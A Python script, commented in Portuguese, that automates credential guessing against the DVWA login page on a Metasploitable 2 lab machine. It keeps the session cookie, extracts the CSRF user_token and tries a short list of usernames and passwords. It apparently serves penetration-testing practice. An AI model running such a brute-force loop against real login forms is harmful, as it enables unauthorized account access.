#!/usr/bin/env python3
"""
check_csrf_login.py

Script de validacao manual (independente do Medusa/Hydra) para o
formulario de login do DVWA (/dvwa/login.php) rodando no Metasploitable 2.

Objetivo: usar requests.Session() para manter o cookie PHPSESSID ativo
entre a requisicao GET inicial (que inspeciona o DOM em busca de um
token oculto, ex. user_token) e o envio POST das credenciais, evitando
os falsos positivos observados ao usar o Medusa diretamente contra essa
tela (ferramentas que nao gerenciam sessao/redirecionamento HTTP
acabam interpretando a resposta de forma incorreta).

Uso:
    python3 check_csrf_login.py
"""

import requests
from bs4 import BeautifulSoup

TARGET_URL = "http://192.168.56.101/dvwa/login.php"

USERS = ["msfadmin", "msf", "admin"]
PASSWORDS = ["password", "123456", "admin"]

FAIL_STRING = "Login failed"


def get_hidden_token(session: requests.Session) -> str | None:
    """Faz um GET na pagina de login e procura por um campo oculto
    (ex. user_token) no formulario, caso exista."""
    resp = session.get(TARGET_URL)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    return token_input["value"] if token_input else None


def try_login(username: str, password: str) -> bool:
    session = requests.Session()
    token = get_hidden_token(session)

    payload = {
        "username": username,
        "password": password,
        "Login": "Login",
    }
    if token:
        payload["user_token"] = token

    resp = session.post(TARGET_URL, data=payload)

    if FAIL_STRING in resp.text:
        return False
    return True


def main() -> None:
    for user in USERS:
        for pwd in PASSWORDS:
            sucesso = try_login(user, pwd)
            if sucesso:
                print(f"[+] Autenticacao bem-sucedida com: {user}:{pwd}")
            else:
                print(f"[-] Falha na autenticacao para: {user}:{pwd}")


if __name__ == "__main__":
    main()
